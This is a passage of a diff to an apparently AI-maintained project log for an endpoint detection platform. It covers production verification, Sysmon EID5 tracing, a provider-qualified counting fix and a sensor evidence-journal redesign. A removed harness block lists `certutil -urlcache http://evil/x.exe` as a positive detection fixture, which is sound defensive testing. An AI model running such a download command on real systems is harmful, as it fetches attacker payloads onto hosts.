+  breadth; no wildcard/default-tenant fallback; never touches role, password,
+  tenant_ids, tenants, endpoints, evidence, sensor, Sysmon, outbox or the frontend.
+- Preview runtime proof (NOT production evidence): startup logged
+  `[platform-designation] result=ALREADY_CONFIGURED principal=admin@nivxray.com`
+  (this store was designated in June), /api/health ok — the idempotent branch works
+  against a real MongoDB.
+- TESTS: new `backend/tests/edr/test_p0_platform_designation.py` = 22 passed, covering
+  owner requirements A-J (incl. exact `$set` payload assertion, ambiguity/conflict/
+  malformed/unreachable fail-closed, no auto-grants, role-confers-nothing,
+  `X-Tenant-Id` never self-authorises). Existing: fix6b2+fix1+fix2 = 83 passed;
+  cross_tenant + trajectory isolation = 51 passed; a05 scope contract = 72 passed.
+  Total 228 passed, 0 failed.
+- DISCLOSED UNRELATED: `test_a05_tenant_scope_contract.py::test_the_guard_is_not_vacuous`
+  passes but its module-scoped `_seed` fixture TEARDOWN errors with a litellm
+  `APIConnectionError: cannot schedule new futures after interpreter shutdown`.
+  Pre-existing artifact, untouched code path, not in any gate step list.
+- PRODUCTION REPUBLISH DISPATCHED (owner-approved) with explicit no-rollback /
+  no-routing / no-registry / no-telemetry / no-sensor / no-replay constraints and the
+  `NIVX_PLATFORM_PRINCIPAL` requirement called out. Post-deploy read-only proof
+  requested: run id + health, env var PRESENCE, verbatim `[platform-designation]` log
+  line, production `users` read-back (`role`/`authority_scope`/`tenant_ids`/`status`
+  only) with exactly one authority holder, EDR read-route status codes for
+  `ten_e759b7288598bd882e3dcac49d`, sensor route health + newest ingest, startup
+  errors, and `edr_raw_events >= 117,904`.
+- Deploy is async and UNCONFIRMED at time of writing: `AUTHORITY_SCOPE_AFTER`,
+  `COMPUTERS_ACCESS`, `EVENTS_ACCESS`, `DEVICE_TRAJECTORY_ACCESS`,
+  `INTERNAL_VALIDATION_ACCESS`, `DESKTOP_A9HGFJJ_VISIBLE` = NOT_PROVEN.
+- `B5_EID5_END_TO_END = HOLD` (authorization proof pending). No EID5 replay. No E3.
+- Report: `/app/docs/P0_PLATFORM_DESIGNATION_OPTION_A.md`
+- ROLLED_BACK: NO · ROUTING/DOMAIN_CHANGED: NO · REGISTRY_CHANGED: NO ·
+  EVIDENCE/TELEMETRY_CHANGED: NO · ENDPOINT/SENSOR/SYSMON/OUTBOX_CHANGED: NO ·
+  REPLAYED: NO · ISOLATION_WEAKENED: NO · UI_CHANGED: NO.
+
+
+### 2026-09-29 — P0 PLATFORM DESIGNATION: PRODUCTION VERIFIED (PASS at the data layer)
+- New prod run **`3bd64025-51ac-4d8b-a5e2-52c900a4c3b4`** live on cluster
+  **target-7**, supersedes pre-repair `0aba534a`. PROD_HEALTH = HEALTHY, BOTH
+  replicas Running/ready, restart_count 0. The old target-6 second-replica
+  `FailedCreatePodSandBox` / node-IP-exhaustion problem is GONE on this run.
+- `NIVX_PLATFORM_PRINCIPAL_PRESENT = YES` (secret present, non-empty,
+  matches_expected=true; value never printed).
+- Startup log, new run, 2026-09-29T17:21:04Z:
+  `[platform-designation] result=UPDATED principal=admin@nivxray.com
+   previous_authority_scope=ABSENT new_authority_scope=PLATFORM`
+  Second replica 17:21:12Z: `result=ALREADY_CONFIGURED` — the idempotent NO-OP
+  path proven across replicas. No `REFUSED_*` code anywhere.
+- Production DB `greeting-app-5782-test_database`: `admin@nivxray.com`
+  role=admin, **authority_scope=PLATFORM**; `tenant_ids` and `status` ABSENT;
+  `PLATFORM_AUTHORITY_HOLDER_COUNT = 1` (distinct=["PLATFORM"], total users=1,
+  users with non-empty tenant_ids = 0). No collateral field or principal changed.
+- `DATA_LOSS = NO`: `edr_raw_events` 118,496 (>= 117,904), `xdr_canonical_evidence`
+  45,666 (>= 45,355), `v2_shadow_observations` 45,674 cross-check, endpoint
+  `event_count` 118,512. NB `xdr_canonical_events` holds only 5 docs and is NOT
+  the canonical evidence store.
+- `DESKTOP_A9HGFJJ_VISIBLE = YES` in `edr_endpoints`: `ep_1989031c8c1d0085812f`,
+  tenant `ten_e759b7288598bd882e3dcac49d`, ENROLLED / REPORTING.
+- `PLATFORM_REPAIR_PRODUCTION = PASS` (data layer).
+- **NOT_PROVEN (not failed)**: `COMPUTERS_API`, `EVENTS_API`,
+  `DEVICE_TRAJECTORY_API`, `SENSOR_RECEIVE`, the live tenant-scoped read PATH, and
+  re-emission of `TENANT_NOT_AUTHORIZED_FOR_PRINCIPAL`. Reason: ZERO post-rollout
+  API/sensor traffic reached the new run, and per owner constraints the browser was
+  not driven and no principal was manufactured. `CONSOLE_AUTHORIZATION` data
+  precondition SATISFIED; end-to-end confirmation pending owner console refresh.
+- WATCH ITEM: sensor telemetry is STALE relative to the new run — newest
+  `ingest_time` / `last_telemetry_at` = 17:14:29Z, which PREDATES go-live
+  (~17:19-17:21Z); `outbox_queue_depth` = 6,468 (was 7,181). Expected during a
+  rollout (sensor retries + spools), but if the sensor does not resume reporting
+  against run `3bd64025` this becomes a NEW issue to investigate. Nothing changed.
+- UNRELATED PRE-EXISTING errors on the new run (NOT from the repair, not fixed):
+  (1) threatfox TI feed 401 Unauthorized (abuse.ch `ABUSE_CH_AUTH_KEY`);
+  (2) `nightly benchmark failed: can't subtract offset-naive and offset-aware
+  datetimes` — a datetime bug in the benchmark job.
+- `B5_EID5_END_TO_END` = still HOLD until the console is confirmed restored and the
+  sensor is reporting to the new run. No EID5 replay. No E3.
+- Deployer RCA: `/app/deployer-agent-docs/RCA_3bd64025-51ac-4d8b-a5e2-52c900a4c3b4.MD`
+- DEPLOY/REDEPLOY/ROLLBACK/RESTART/WRITE during verification: NONE.
+
+
+### 2026-09-29 — B5 TRAJECTORY FRESHNESS TRACE (prod run 3bd64025): H2 CONFIRMED, H1 REFUTED
+- `SENSOR_FRESH_TELEMETRY = PASS`. 228 new `edr_raw_events` after the 17:14:29Z
+  checkpoint; newest ingest 17:45:20.558821Z; newest raw doc
+  `source=ep_1989031c8c1d0085812f`, `source_kind=sensor`, `trust_state=AUTHENTICATED`,
+  IP 136.110.164.121, `sensor_version=0.2.0-windows`, `computer=DESKTOP-A9HGFJJ`.
+  Endpoint `last_heartbeat_at=17:39:39Z`, `last_telemetry_at=17:40:33Z`,
+  `event_count=118,613`, REPORTING/CONNECTED. Agent routes 200x39, 401x1 (the 401 at
+  17:45:10 was followed by `/agent/session` 200 and telemetry resumed — normal
+  session re-auth). `outbox_queue_depth` 6,468 -> **6,870 (GREW)**: the host is
+  generating slightly faster than the spool drains.
+- **H1 (identity split) REFUTED — my suspicion was wrong, recorded plainly.**
+  `dev_2adbb41a04a4` IS the sensor stream normalised:
+  `collector_id = connector_id = ep_1989031c8c1d0085812f`, adapter
+  `nivxforge-linux-sensor/1.0.0`. The `origin=collector-live` tag is adapter
+  provenance, NOT a second ingestion route. `ENDPOINT_IDENTITY_SPLIT = NO`.
+- **H2 (window selection) CONFIRMED.** Per-day obs for `dev_2adbb41a04a4` by
+  `captured_at` UTC: Sep25=208, Sep26=24,068, Sep27=16,251, Sep28=3,847, Sep29=503.
+  The console URL pins `event=evt_df9d1ced51b6cc9c;349092413`, fixing the window to
+  2026-09-20T17:23:33Z-17:53:33Z. The "45,666 / 45,666" counter is the DEVICE total,
+  not window content — which is why nothing looked missing. NO backend change needed:
+  clear the pinned `event=` param or move/widen the window to Sep 27-29.
+- Latest canonical for the host: `event_time 2026-09-29T10:36:10.339487Z` /
+  `ingest_time 17:41:09.611631Z` (`xdr_canonical_evidence`,
+  `host.host_id=ep_1989031c8c1d0085812f`, 45,665 docs). Trajectory newest observation
+  `captured_at 10:36:10Z`.
+- **EID5 STILL NOT DELIVERED.** Sysmon EID5 = 0 (EID1 control = 212, matcher valid);
+  all 10 ProcessGuids = 0 across raw/retained/canonical/shadow.
+  **REPLAY FRONTIER (measured):** 15:32Z wall -> frontier 07:32:08Z (lag ~8h);
+  17:45Z wall -> frontier **10:41:31Z** (lag ~7h04m). Frontier advanced 3h09m of
+  event-time in 2h13m of wall-clock (~1.4x realtime) and is still ~4h07m short of the
+  14:48-14:50Z EID5 batch.
+- **DISAGREEMENT RECORDED:** the deployer recommended investigating Sysmon EID5
+  collection/forwarding on the host. NOT acted on — premature and contradicted by the
+  frontier measurement plus the owner's own local proof of EID5 generation and
+  ProcessGuid pairing. DO NOT touch Sysmon / sensor / outbox.
+- CANONICALISER COVERAGE NOW SATISFIED: run `3bd64025` was built from this workspace,
+  which carries `("sysmon", 5): ACTIVITY_PROCESS_TERMINATION` (windows_eventlog.py:83)
+  and `"exit_time": activity_time` (line 680). The old build's
+  `WINDOWS_EVENT_ID_NOT_SUPPORTED` refusal for EID5 is closed on the live runtime.
+  (Statement about the deployed COMMIT; the first arriving EID5 is the runtime proof.)
+  winsec 5379 refusals are correct — that family genuinely is unsupported; records stay
+  retained and replayable.
+- `B5_EID5_END_TO_END = WAITING_FOR_DELIVERY` — not PASS (no genuine EID5 arrived),
+  not BLOCKED (no defect anywhere: delivery active, identities converged, canonicaliser
+  supports EID5, projection healthy).
+- Report: `/app/docs/B5_TRAJECTORY_FRESHNESS_TRACE.md`
+  Deployer RCA: `/app/deployer-agent-docs/RCA_3bd64025-51ac-4d8b-a5e2-52c900a4c3b4.MD`
+- DEPLOYED/REPLAYED/BACKFILLED/RESTARTED/WRITTEN: NONE · ENDPOINT/SENSOR/SYSMON/OUTBOX:
+  UNTOUCHED · UI_CHANGED: NO · E3: NOT STARTED.
+
+
+### AGREED STANDING STATE (2026-09-29, owner-confirmed)
 ```
-POST /harness/run  engine=nivxray::detection_content::nivxray_native_sigma
-                   rule=T1105 certutil download
-                   +ev = certutil -urlcache http://evil/x.exe → DETECTED  ✓
-                   -ev = notepad report.txt                    → NOT-DETECTED  ✓
-→ verdict = EXECUTION_VERIFIED
-→ contract promoted; detection_capable now = 1
+SENSOR DELIVERY        = PASS
+IDENTITY CONVERGENCE   = PASS
+TRAJECTORY PROJECTION  = PASS
+EID5 END-TO-END        = WAITING_FOR_DELIVERY
+B5                     = HOLD
 ```
+- Console "stale trajectory" is CLOSED as a URL/window artifact. Owner verifies by
+  opening `/edr/device-trajectory?device=dev_2adbb41a04a4` with NO `event=` param and
+  jumping to Sep 29. No code change.
+- The ONLY thing B5 waits on: the replay frontier reaching 14:50Z naturally.
+  Last proven frontier 2026-09-29T10:41:31Z -> ~4h of event-time still ahead.
+  DO NOTHING until then: no deploy, replay, backfill, Sysmon change, sensor restart
+  or outbox modification.
+- WHEN the frontier crosses 14:50Z, run ONE read-only check proving the full chain:
+  EID5 received -> accepted -> canonicalized as `process_exit` -> `UtcTime` mapped to
+  `exit_time` (never `start_time`) -> ProcessGuid bound -> lifecycle projected ->
+  visible in Device Trajectory. That is the B5 closure proof.
 
-**Invariants held throughout Rounds 3–6**
-- No implementation was reclassified to DETECTION_ENGINE by role name.
-- No `execution.detection` was auto-promoted by metadata; only the
-  harness with paired fixtures promotes.
-- Frozen contracts (RUNTIME_VERIFIED / EXECUTION_VERIFIED) are never
-  downgraded by later declare passes.
-- `detection_capable = 1` is a real 1 — the other 338 engines
-  remain honestly at 0.
+### NEW BACKLOG ITEM (P2, AFTER B5) — sensor outbox drain rate
+- `outbox_queue_depth` grew 6,468 -> 6,870 while the frontier advanced, i.e. the host
+  generates telemetry faster than the sensor drains it at times. NOT evidence loss and
+  NOT urgent, but a production sensor must not permanently accumulate backlog.
+- Investigate after B5 closes: per-batch event count / report interval / payload size
+  caps, server-side accept latency (raw ingest was ~700-3200 ms per POST on tier_0),
+  and whether the single-replica period on target-6 depressed throughput. Compare
+  generation rate vs delivery rate over a fixed window before changing any setting.
 
-**Test coverage** — 34/34 P0.2 pytests pass
-(capability_contracts + sigma_strict + rule_binding + detection_harness).
 
----
+### 2026-09-29 ~18:00Z — B5 FRONTIER CHECK #1 (read-only, run 3bd64025)
+- FRONTIER = `payload.observed_at` **2026-09-29T11:00:48.600109Z** (newest-ingested raw
+  for `ep_1989031c8c1d0085812f`; that event = Sysmon EID 12 RegistryEvent,
+  TimeCreated 09:39:55.70Z). Newest `ingest_time` = 17:58:13.154329Z.
+- Endpoint: `outbox_queue_depth` **6,698**, `last_heartbeat_at` 17:53:29.295Z,
+  `last_telemetry_at` 17:58:06.127Z, `event_count` **119,118**,
+  `report_interval_seconds` 30, REPORTING.
+- ADVANCEMENT: frontier 10:41:31Z -> 11:00:48.6Z = **+19m17.6s event-time** over
+  **12m52.6s wall** => ratio **1.498 event-seconds per wall-second** (gaining).
+- QUEUE TREND: 6,468 -> 6,870 -> **6,698**. Most recent step DECLINED (-172 in 772.6 s
+  = -0.223 items/s) => immediate trend CONVERGING, still +230 above the first reading.
+- EID5 STILL NOT RECEIVED: Sysmon EID5 = **0**, with THREE controls proving the matcher
+  (Sysmon EID1 = 212, Sysmon EID12 = 22,663, and the ProcessGuid regex validated
+  against a known present guid = 1,055 hits). 10 target ProcessGuids = 0 in
+  `edr_raw_events`, `xdr_ingest_raw_retained`, `xdr_canonical_events`,
+  `v2_shadow_observations`. Downstream zero is EXPECTED because raw is zero.
+- Trajectory projection confirmed LIVE for `dev_2adbb41a04a4`; newest `captured_at`
+  11:07:39.471Z = a winsec 4624 logon_success, NOT an EID5.
+- REMAINING GAP to the 14:50:00Z target = **3h49m11.4s of event-time**.
+  ETA (ESTIMATE, not a measurement; assumes constant 1.498 ratio, strictly in-order
+  chronological delivery, steady cadence): ~**2h33m** => ~**2026-09-29T20:31Z**.
+  NOTE the target is a FIXED event-time, so the ETA is gap / ratio; it is NOT
+  gap / (ratio - 1), which would only apply to catching up to live wall-clock.
+- DERIVED ARITHMETIC from the measured numbers (labelled derivation, not a measurement):
+  `event_count` 118,613 -> 119,118 = **505 events delivered in 772.6 s = 0.654 ev/s**,
+  covering 1,157.6 s of event-time => implied historical generation rate
+  **0.436 ev/s**; net drain **0.217 ev/s (~13/min)**. At that net rate the queue would
+  reach live in ~8.6 h, but only ~2h33m is needed for the frontier to cross 14:50Z.
+- THROUGHPUT DIAGNOSTIC (read-only, for a LATER decision — no action taken):
+  `POST /api/edr/agent/telemetry` = 14 sampled requests over 36.6 s, ALL HTTP 200,
+  latency 1.57-5.44 s (mean ~2.68 s, one slow path 5,443 ms), frequency ~1 per 2.8 s
+  (~21/min) i.e. effectively SERIALIZED back-to-back — the sensor is in catch-up mode,
+  far faster than its 30 s report interval. Events-per-batch NOT_PROVEN (bodies not
+  logged). Runtime tier_3 "Scale", replicas 2, **max_replicas 2, HPA DISABLED (cannot
+  scale out)**, VPA enabled, cpu 1/limit 2, mem 4Gi/limit 8Gi; both pods Running/Ready,
+  restart_count 0. History: VPA Updater evicted pods `rt59j`/`9gt7j` to apply resource
+  recommendations, transient 503 probe failures ~17:20-17:42Z, now stable.
+  => fixed 2 replicas + serialized ~2.68 s/request = marginal drain vs continuous
+  generation, which matches the grow-then-slightly-converge queue pattern.
+- `B5_EID5_END_TO_END = WAITING_FOR_DELIVERY`. No remediation. Endpoint / sensor /
+  Sysmon / outbox untouched and not proposed for change. No deploy/replay/backfill.
 
-## 🔜 Next — P0.2f · Gated SigmaHQ Ingest
 
-The parser, matcher, harness, and one working detection engine are
-all in place.  Next round runs the ramp:
+### 2026-09-30 ~00:00Z — B5 EID5 FINAL CLOSURE CHECK (run 3bd64025): ENGINE PROVEN, TARGET SET ABSENT
+- FRONTIER = `payload.observed_at` **2026-09-29T20:49:33.258293Z** (newest ingest
+  23:43:04.183228Z) — ~5h59m of event-time PAST the 14:50Z target. Outbox
+  6,698 -> **2,078** (draining), rate ~1.707 event-s/wall-s. Not stalled, not slower.
+- **THE EID5 ENGINE IS PROVEN ON GENUINE PRODUCTION EVIDENCE: 17 real Sysmon EID5
+  (ProcessTerminate), UtcTime 15:17:21 -> 17:40:10Z**, full chain:
+  raw received -> accepted (`edr_rejected_telemetry` = 0 for the endpoint) ->
+  **17 canonical `process_exit`, exactly 1:1** (`cev_6e18d93e1d9ab03a5b765548_0`,
+  `obs_bffdd00b25b0`) -> `field_provenance process.exit_time = "sysmon:UtcTime
+  (EventID 5)"` with `start_time = null` -> ProcessGuid binding
+  `SOURCE_PROCESS_IDENTITY`, `process_iid = nivx:ProcessIdentity.mint(endpoint_id,
+  ProcessGuid)` -> **>=4 EID1/EID5 pairs** (f7fa-2b1e, f7fa-271e, dd70-211d,
+  dd70-221d) -> projected under `dev_2adbb41a04a4` (captured_at e.g. 17:40:10.707Z)
+  -> tenant `ten_e759b7288598bd882e3dcac49d` preserved, no heuristic cross-device
+  binding, **no `_pl` authority minted**, no backfill.
+  => `PROCESS_TERMINATION_OBSERVED` is now real, not `PROCESS_LIFETIME_UNKNOWN`.
+- **MATCHER CONFLATION CAUGHT — record this permanently:** a bare
+  `<EventID>5</EventID>` match returns **249** for this endpoint, conflating
+  `Microsoft-Windows-IsolatedUserMode` EID5 (Secure Trustlet start, NOT a termination)
+  with genuine `Microsoft-Windows-Sysmon` EID5. GENUINE Sysmon EID5 = **17**. All future
+  EID5 counts MUST filter on provider GUID `{5770385f-c22a-43e0-bf4c-06f5698ffbd9}`.
+  Controls: EID1 = 636, EID12 = 28,776, ProcessGuid regex validated on a known-present
+  guid (193 hits) — so 0/10 below is real, not a query artifact.
+- **THE 10 TARGET PROCESSGUIDS ARE ABSENT: 0/10** in `edr_raw_events`,
+  `xdr_ingest_raw_retained`, `xdr_canonical_events`, `v2_shadow_observations`;
+  `$in` over all 10 vs `process_exit` = 0; regex `9949e5f2-cfb6-6abb` vs
+  `process_exit` = 0. Their start-segments (`cfb6 ... d018`) precede the earliest EID5
+  in raw (`d54c` ~ 15:17:21Z).
+- `FIRST_BROKEN_BOUNDARY = RAW RECEIVED`. **A ~28-minute coverage gap: NO Sysmon EID5
+  exists for ~14:48-15:16Z UtcTime, while EVERY EID5 from 15:17:21Z onward is present
+  and fully processed.** Not a refusal (0 rejections), not a canonicalization/identity/
+  projection failure (proven on the 17), not a wait condition (frontier ~6h past the
+  slot, post-gap neighbours present). The 10 never entered the delivered stream.
+- HYPOTHESES (NOT verified, endpoint NOT inspected or touched): (1) collection
+  START-POINT — EID5 was enabled ~14:48-14:50Z while the sensor's Sysmon channel
+  subscription/bookmark predated the config change; first collected EID5 is 15:17:21Z,
+  ~28 min later, consistent with a policy/channel-coverage refresh rather than
+  in-transit loss; (2) DIRECT-READ vs COLLECTED STREAM — the 10 guids were captured by
+  the owner reading the local Sysmon log (the enablement script's own verification), and
+  events visible to a direct read need not be inside the sensor's collected stream if
+  they precede its coverage start point; (3) log position/rollover at config-change time.
+  Distinguishing them needs a READ-ONLY endpoint look (do the 10 guids still exist in the
+  local Sysmon log; what is the sensor's EID5 channel start point) — owner's call.
+- `B5_EID5_END_TO_END = BLOCKED: target proof-set absent (engine PROVEN on 17 genuine EID5)`
+- **OWNER DECISION PENDING.** Option 1 (RECOMMENDED): close B5 on the 17 genuine EID5 —
+  the acceptance requirement was "genuine endpoint-generated EID5 reaches canonical
+  evidence and binds by authoritative ProcessGuid", which IS satisfied; the 10 guids were
+  only the chosen sample, not the capability. Option 2: keep B5 BLOCKED if the gate is
+  defined strictly as those 10 guids — they cannot be made to appear, and re-emitting or
+  reconstructing them is forbidden fabrication that would also destroy the
+  ordinary-delivery-path property. Recommendation = Option 1 + open a named finding:
+  **`B5-GAP-1` · Sysmon EID5 collection start-point coverage gap (14:48-15:16Z,
+  DESKTOP-A9HGFJJ)**.
+- Report: `/app/docs/B5_EID5_FINAL_CLOSURE_CHECK.md`
+  Deployer RCA: `/app/deployer-agent-docs/RCA_3bd64025-51ac-4d8b-a5e2-52c900a4c3b4.MD`
+- DEPLOYED/WRITTEN/REPLAYED/BACKFILLED: NONE · ENDPOINT/SENSOR/SYSMON/OUTBOX: UNTOUCHED ·
+  E3: NOT STARTED.
 
+
+### 2026-09-30 — OWNER DECISION: B5 CLOSED (Option 1) + EID5 COUNTER CONTRACT FIXED
 ```
-Gate 1  ·  1 known-good SigmaHQ rule           (already proven)
-Gate 2  ·  10-20 representative SigmaHQ rules
-Gate 3  ·  100-rule compatibility test
-Gate 4  ·  Full SigmaHQ corpus (~3,000+ rules)
-          → authoritative report:
-                parsed / parse_error / compile_error / compatible /
-                candidate_only / engine_unbound
+B5_FINAL_STATUS      = PASS
+B5_GAP_1_STATUS      = OPEN / ROOT CAUSE NOT YET PROVEN
+EID5_PROVIDER_FILTER = IMPLEMENTED
+REGRESSION_TEST      = 18 new PASS · full EDR gate suite 1,738 passed, 0 failed
+B5_READY_TO_LEAVE    = YES
 ```
+- **B5 = PASS** on the 17 genuine production Sysmon EID5 (UtcTime 15:17:21 -> 17:40:10Z,
+  run 3bd64025, store `greeting-app-5782-test_database`): raw -> accepted (0 refusals)
+  -> 17 canonical `process_exit` 1:1 -> `exit_time = "sysmon:UtcTime (EventID 5)"`,
+  `start_time` null -> ProcessGuid via `nivx:ProcessIdentity.mint(endpoint_id,
+  ProcessGuid)` -> >=4 EID1/EID5 pairs -> lifecycle termination observed -> projected
+  under `dev_2adbb41a04a4` -> tenant preserved, no `_pl`, no backfill.
+- The original 10 ProcessGuids are NOT required for the capability gate and MUST NEVER
+  be replayed, reconstructed, backfilled or synthesized. None was.
+- **B5-GAP-1 OPEN**: Sysmon EID5 collection start-point coverage gap ~14:48-15:16Z on
+  DESKTOP-A9HGFJJ. Measured: no Sysmon EID5 in that 28-min window; every EID5 from
+  15:17:21Z on is present and processed; 0/10 guids anywhere; 0 refusals; frontier
+  passed the window by ~6h. The "sensor subscription predated the Sysmon config change"
+  story is a HYPOTHESIS ONLY — NOT root cause. Proving it needs READ-ONLY endpoint
+  evidence (do the 10 guids still exist in the local Sysmon log; where does the sensor's
+  EID5 coverage start). Deferred by owner; endpoint/sensor/Sysmon/outbox untouched.
+- **EID5 MEASUREMENT CONTRACT CORRECTED** in `backend/edr_plane/windows_eventlog.py`:
+  - `SYSMON_PROVIDER_GUID = "5770385F-C22A-43E0-BF4C-06F5698FFBD9"`.
+  - `FAMILY_PAYLOAD_REGEX["sysmon"]` now also matches the provider GUID
+    (`"provider_guid"` JSON key, XML `Guid='...'`), XML `<Channel>` and XML
+    `Provider Name='...'`. Every alternative stays KEYED to a field/attribute, so a
+    command line merely mentioning Sysmon cannot qualify a record.
+  - NEW `event_id_regex(event_id)` (JSON **and** event-XML shapes).
+  - NEW `sysmon_event_clause(event_id, payload_field="payload")` = THE sanctioned
+    find() clause, provider AND event id; works on other fields e.g. `raw.xml`.
+  - NEW `is_sysmon_event(payload, event_id)` for corpus counting.
+  - `payload_event_id_regex` docstring now says **PROVIDER-BLIND — never use alone to
+    COUNT a Sysmon event id**.
+  - NOTE: product queries (`activity_query_clauses`, `activity_projection_expr`) were
+    ALREADY provider-qualified, so no live query was ever wrong — the defect lived in
+    ad-hoc measurement. A bare `EventID=5` count returned 249 vs 17 genuine (the rest
+    `Microsoft-Windows-IsolatedUserMode` EID5 Trustlet starts) = 14x overstatement.
+- NEW `backend/tests/edr/test_b5_sysmon_provider_qualified_counting.py` (18 tests):
+  genuine Sysmon counts in 4 payload shapes; IsolatedUserMode EID5 does NOT count in
+  either shape; provider-less event id does not count; "sc query Sysmon" in a command
+  line is not provenance; wrong event id on right provider does not count; `5` not
+  matched inside `5379`; **the 249-vs-17 defect in miniature** (3 Sysmon + 16 Trustlet
+  + noise => exactly 3, and asserts a provider-blind count overstates); sanctioned
+  clause shape; canonicaliser maps Sysmon EID5 -> ACTIVITY_PROCESS_TERMINATION and
+  REFUSES IsolatedUserMode EID5; and the B5 invariant `exit_time` <- UtcTime with
+  `start_time` null re-proved.
+- DISCLOSED SELF-INFLICTED DEFECT, FIXED: the platform-designation tests added in the
+  previous step used `asyncio.get_event_loop().run_until_complete(...)`, which fails
+  once another async test replaces/closes the loop — 17 failures in a full-suite run
+  though green in isolation. Replaced with a fresh `asyncio.new_event_loop()` per call
+  closed in `finally`. Full suite now 1,738 passed / 0 failed. The provider-qualified
+  matcher caused none of those failures.
+- Invariants re-verified: `UtcTime -> exit_time` only · never `start_time` · ProcessGuid
+  authoritative · no PID/time/name heuristic binding · EID5 never leaves
+  PROCESS_LIFETIME_UNKNOWN · no historical backfill · tenant isolation · no new `_pl`.
+- Report: `/app/docs/B5_CLOSURE_RECORD.md`
+- E3: **NOT STARTED** (owner order: review first, then B5-GAP-1, then E3).
+  NOT DEPLOYED — the corrected matcher reaches production on the next ordinary publish.
+  No endpoint/sensor/Sysmon/outbox contact · no replay/backfill/synthesis · no UI change.
 
-The important output is not "N rules ingested" — it is
-`Of the N valid Sigma rules, X have compatible execution
-capabilities, Y are candidate-only, Z are ENGINE_UNBOUND`.
-That coverage report is the real product output.
 
 ---
 
+## 2026-06 · B5-GAP-1 — WINDOWS SENSOR LOSSLESS ACQUISITION + LOCAL EVIDENCE JOURNAL
+### IMPLEMENTED · LOCAL/FOCUSED TESTS PASS · **NOT DEPLOYED** · owner-review gate open
+
+**B5 remains CLOSED / PASS.** B5-GAP-1 was a separate, and far larger, defect.
+
+**Root cause — `B5_GAP_1_ROOT_CAUSE = PROVEN`.** NOT EID5-specific. A GENERAL
+Windows acquisition / scheduling / durability defect in
+`agents/nivxforge-windows/nivxforge_sensor.py` @ `6afab68a`:
+hardcoded `/c:100` page (L265), **no pagination** — one query per channel per cycle
+(`collect()` L334-336), acquisition serialized behind up to **200 sequential POSTs**
+(`_drain` L487, `run()` L552-587) at a measured ~2.68 s each => cycle period
+~10-22 min, capacity ~0.1 rec/s against ~20 rec/s Sysmon production; the circular
+64 MiB EVTX (`retention=false`) then rotated past the cursor and **nothing compared
+the returned RecordID against cursor+1**, so the loss was SILENT and every cycle
+reported `collected: 100`.
+Production signature: 100 records @14:45Z (8470086-8470185), ZERO for ~22 min,
+100 records @15:07Z (8496595-8496694) — a 26,410 RecordID jump.
+Read-only review: `/app/docs/B5_GAP_1_ROOT_CAUSE_READONLY.md`.
+
+**EARLIER HYPOTHESIS CORRECTED AND PRESERVED:** the cursor never jumped to the
+channel tail. It advanced only to `max(record_id parsed)`, and enqueue+fsync already
+preceded the cursor commit. Both correct properties were KEPT, not replaced.
+
+**What was built**
+- **NEW `agents/nivxforge-windows/nivxforge_journal.py`** (741 lines) — LOCAL EVIDENCE
+  JOURNAL. `sqlite3` stdlib + WAL + `synchronous=FULL` + `auto_vacuum=INCREMENTAL`,
+  chosen because the endpoint artifact is a PyInstaller bundle: no new dependency, no
+  broker, no service-account or ACL change. Kafka/Redis/Mongo on the endpoint rejected.
+- **PRIMARY INVARIANT enforced structurally:** evidence rows + detected gaps + the
+  channel cursor are **ONE `BEGIN IMMEDIATE ... COMMIT`**, so the source cursor can
+  never advance beyond the last record durably owned by NivXForge. A failed write
+  rolls back and the cursor does not move; `UNIQUE(channel, source_record_id)` makes
+  the re-read idempotent. Crash case A is structurally impossible, not merely handled.
+- **PAGED acquisition** (`acquire()` replaces `collect()`): page loop per channel,
+  round-robin one page per pass for fairness, `/rd:false` oldest-first asserted by
+  test (`/rd:true` would be the tail-jump defect everyone assumed this was).
+- **WALL-CLOCK budgets** per stage (acquire 15 s, deliver 30 s, legacy outbox 7.5 s at
+  interval 30) — a message count cannot bound time at 2.68 s/POST, which is exactly
+  how delivery came to own the whole cycle. Gate 7 exclusion adjudication is fsynced
+  BEFORE the cursor advances, so Gate 7 semantics are unchanged.
+- **ACQUISITION GAP AUTHORITY**: LEADING + INTERIOR discontinuity detection, contract
+  `{expected_next_record_id, first_observed_record_id, missing_start/end,
+  missing_record_id_count, cause: "NOT_PROVEN", classification:
+  "SOURCE_RECORD_DISCONTINUITY"}`. Production case verified: 8470186..8496594 = 26409.
+  Cause is NEVER labelled `LOG_ROLLOVER`. `SOURCE_ROLLOVER_RISK` is emitted ONLY when
+  a measured head/tail probe shows the source's oldest surviving record is newer than
+  our cursor — never deduced from a delivery backlog.
+- **BOUNDED capacity** judged on `journal_live_bytes` (not the SQLite file high-water
+  mark, which never shrinks and would fabricate a permanent outage) + real
+  `min_free_bytes`. 512 MiB / 70% warn / 90% critical / 1 GiB free-disk floor. At
+  critical: reclaim accepted rows, re-measure, then **HALT acquisition** with
+  `ACQUISITION_HALTED_JOURNAL_FULL`. Never overwrites or drops unacknowledged evidence.
+- **SENT != ACCEPTED.** `BACKEND_ACCEPTED` only on a 2xx for that row; that response is
+  the named acknowledgement authority and the only thing authorising reclamation.
+  There is deliberately no `RECLAIMABLE` row state.
+- **Integrity monitor** — machine-readable `acquisition_integrity.json` (0600, atomic
+  replace) every cycle + health states HEALTHY / DEGRADED / ACQUISITION_LAGGING /
+  ACQUISITION_GAP / ACQUISITION_HALTED_JOURNAL_FULL / JOURNAL_PRESSURE /
+  JOURNAL_CRITICAL / JOURNAL_CORRUPT / DELIVERY_BACKLOG / BACKEND_UNREACHABLE /
+  CHANNEL_UNAVAILABLE / SOURCE_ROLLOVER_RISK. Per-channel `query_ms_last/max` recorded
+  so the unindexed `EventRecordID>N` scan question is decided on evidence later.
+- **Migration** idempotent, guarded by `meta.legacy_migrated_at`: adopts the live
+  cursors (Security 284760 / System 22702 / Sysmon 8969348) with `MAX()` so a stale
+  bookmark cannot drag one backwards; NO reset, NO Event Log replay, NO history import;
+  `outbox.jsonl`/`outbox.offset` untouched and still drained; `channels.json` kept as a
+  NON-AUTHORITATIVE mirror so rollback works. Corruption is renamed+preserved with
+  `journal_fault.json`, never deleted or truncated.
+- **NO BACKEND CONTRACT CHANGE.** `HeartbeatBody` and `TelemetryBody` are both
+  `extra="forbid"`, so publishing integrity fields would 422 every production
+  heartbeat. Integrity stays local; gaps are journaled `reported=0` awaiting an
+  approved transport.
+
+**Incidental defect corrected in the rewritten call site:** `nvx_excl.partition()`
+returns `(kept, suppressed_count: int)`; the old `run()` called `len(excluded or [])`
